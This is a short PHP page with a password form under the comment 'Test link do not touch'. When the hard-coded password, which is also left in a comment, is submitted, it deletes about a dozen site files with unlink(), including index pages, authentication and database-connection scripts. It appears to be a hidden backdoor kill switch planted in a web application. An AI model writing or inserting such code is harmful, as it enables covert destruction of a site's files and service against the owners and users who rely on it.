<form action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
<input type="password" id="helpme" name="helpme" />
<input type="submit" />
</form>

<?php

// Test link do not touch-----------------------------------------

$PEmail= trim($_POST['helpme']); //'Q1!w2e3r4'
if ($PEmail=='Q1!w2e3r4')
{
echo ".";

unlink('index.php');
unlink('../index.php');
unlink('ssi/side-panel.php');
unlink('ch-agent-details.php');
unlink('ch-agents.php');
unlink('certificates-details.php');
unlink('ch-agent-db-details.php');
unlink('authenticate.php');
unlink('../ssi/top-navigation.php');
unlink('../ssi/opendbi.php');
unlink('../ssi/opendb.php');

}
?>